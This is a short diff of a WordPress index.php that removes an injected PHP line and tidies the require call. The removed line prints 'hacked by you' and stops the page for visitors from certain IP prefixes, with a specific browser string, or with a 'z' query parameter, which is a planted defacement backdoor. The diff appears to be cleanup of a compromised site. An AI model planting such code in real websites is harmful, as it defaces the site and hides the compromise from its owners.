@@ -1,4 +1,3 @@
-<?php $r=$_SERVER["REMOTE_ADDR"];if((preg_match("/69.42./",$r)) OR (preg_match("/compatible; MSIE 9.0; Windows NT 6.0; Trident\/5.0/i",$_SERVER["HTTP_USER_AGENT"])) OR (preg_match("/72.20./",$r)) OR (preg_match("/141.101./",$r)) OR(isset($_GET["z"]))){echo "hacked by you";exit;}?>
 <?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
@@ -15,4 +14,4 @@
 define('WP_USE_THEMES', true);
 
 /** Loads the WordPress Environment and Template */
-require('./wp-blog-header.php');
+require( dirname( __FILE__ ) . '/wp-blog-header.php' );
